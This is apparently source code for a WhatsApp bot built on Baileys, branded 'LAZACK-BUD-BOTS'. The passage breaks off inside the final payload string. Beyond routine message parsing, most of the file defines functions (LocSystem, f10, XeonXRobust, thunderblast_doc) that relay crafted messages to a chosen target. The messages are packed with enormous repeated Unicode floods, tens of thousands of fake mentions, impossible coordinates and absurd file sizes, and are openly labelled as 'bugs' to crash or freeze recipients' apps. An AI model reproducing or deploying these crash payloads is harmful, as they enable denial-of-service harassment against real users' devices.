require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (Lazack28, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Lazack28.user.id.split(':')[0]+'@s.whatsapp.net' || Lazack28.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Lazack28.decodeJid(Lazack28.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Lazack28.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
try {
ppuser = await Lazack28.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Lazack28.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Lazack28.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//FUNCTION ABAL ABAL  by Lazack28 🗿
    async function LocSystem(target) {
            let virtex = "⿻ 🔐 LAZACK-BUD-BOTS ⿻";
            let memekz = Date.now();

            await Lazack28.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
  async function f10(target, Ptcp = false) {
    await Lazack28.relayMessage(target, {
      extendedTextMessage: {
        text: "`🔐 LAZACK-BUD-BOTS`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["255734980103@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "255734980103@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "255734980103@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: saluranName,
            newsletterJid: saluran,
          },
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./assets/logo.png"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "🔐 LAZACK-BUGS HAAA",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "120363321705798318@newsletter",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321705798318@newsletter",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "255734980103@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('🔐 lazack bugs bot'))
};
async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(10000);
  await Lazack28.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "🔐 LAZACK-BUD-BOTS",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://img86.pixhost.to/images/487/563032543_skyzopedia.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "🔐 LAZACK-BUD-BOTS" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "🔐 LAZACK-BUD-BOTS",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸